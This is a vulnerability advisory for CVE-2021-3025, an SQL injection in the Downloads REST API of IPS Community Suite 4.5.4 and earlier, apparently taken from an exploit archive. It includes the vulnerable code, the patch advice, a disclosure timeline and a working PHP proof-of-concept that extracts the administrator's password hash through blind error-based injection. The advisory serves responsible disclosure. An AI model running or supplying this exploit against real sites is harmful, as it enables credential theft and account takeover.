@@ -1,0 +1,85 @@
+id: 35648
+date: 01/07/2021
+title: IPS Community Suite 4.5.4 SQL Injection Vulnerability
+author: EgiX
+cves: CVE-2021-3025
+
+-----------------------------------------------------------------------------
+IPS Community Suite <= 4.5.4 (Downloads REST API) SQL Injection Vulnerability
+-----------------------------------------------------------------------------
+
+
+[-] Software Link:
+
+https://invisioncommunity.com
+
+
+[-] Affected Versions:
+
+Version 4.5.4 and prior versions.
+
+
+[-] Vulnerability Description:
+
+The vulnerability is located within the
+/applications/downloads/api/files.php script, specifically into the
+GETindex() method:
+
+48. public function GETindex()
+49. {
+50.     /* Where clause */
+51.     $where = array();
+52.     $sortBy = NULL;
+53.
+54.     /* Sort by popular files */
+55.     if( \IPS\Request::i()->sortBy == 'popular' )
+56.     {
+57.         \IPS\Request::i()->sortDir = \IPS\Request::i()->sortDir ?: 'ASC';
+58.         $sortBy = 'file_rating ' . \IPS\Request::i()->sortDir . ',
+file_reviews';
+59.         $where = array( array( 'file_rating>?', 0 ) );
+60.     }
+61.
+62.     /* Return */
+63.     return $this->_list( $where, 'categories', FALSE, $sortBy );
+64. }
+
+User input passed through the "sortDir" GET parameter (when "sortBy"
+is set to "popular") is not properly sanitized before being used to
+construct an SQL query at line 58. This can be exploited by remote
+attackers to e.g. read sensitive data from the database through
+error-based SQL Injection attacks. Successful exploitation of this
+vulnerability requires an API key with permissions to access the
+Downloads Files API.
+
+
+[-] Proof of Concept:
+
+http://karmainsecurity.com/pocs/CVE-2021-3025
+
+--- poc ---
+"; print "\nExample....: php $argv[0] http://localhost/ips/ 6aaf2e085d179866ef40ad0ac9381b36"; print "\nExample....: php $argv[0] https://invisioncommunity.com/ 765ed33ba595c4da8d64c6c22138aa16\n\n"; die(); } list($url, $api_key) = [$argv[1], $argv[2]]; $ch = curl_init(); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bearer ".base64_encode($api_key)]); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); $url = "{$url}api/index.php?/downloads/files&sortBy=popular&sortDir=%s"; $sql = ",(select case when (%s) then 1 else 1*(select table_name from information_schema.tables)end)=1#"; $end = false; $min = true; $idx = 1; while (!$end) { $test = 256; for ($i = 7; $i >= 0; $i--) { $test = $min ? ($test - pow(2, $i)) : ($test + pow(2, $i)); $sub_sql = "select if(ord(substr(members_pass_hash,{$idx},1))<{$test},1,0) from core_members limit 1"; curl_setopt($ch, CURLOPT_URL, sprintf($url, rawurlencode(sprintf($sql, $sub_sql)))); $min = !preg_match("/UNKNOWN_ERROR/", curl_exec($ch)); } if (($chr = $min ? ($test - 1) : ($test)) == 0) $end = true; $pass .= chr($chr); $min = true; $idx++; print "\r[-] Admin's password hash: {$pass}"; } print "\n";
+--- poc end --- 
+
+
+
+[-] Solution:
+
+Apply the vendor patch or upgrade to version 4.5.4.2 or later.
+
+
+[-] Disclosure Timeline:
+
+[19/12/2020] - Vendor notified through HackerOne
+[27/12/2020] - Vendor released a targeted patch
+[05/01/2021] - Vendor released version 4.5.4.2
+[05/01/2021] - CVE number assigned
+[06/01/2021] - Public disclosure
+
+
+[-] CVE Reference:
+
+The Common Vulnerabilities and Exposures project (cve.mitre.org)
+has assigned the name CVE-2021-3025 to this vulnerability.
+
+#  0day.today [2023-03-24]  #
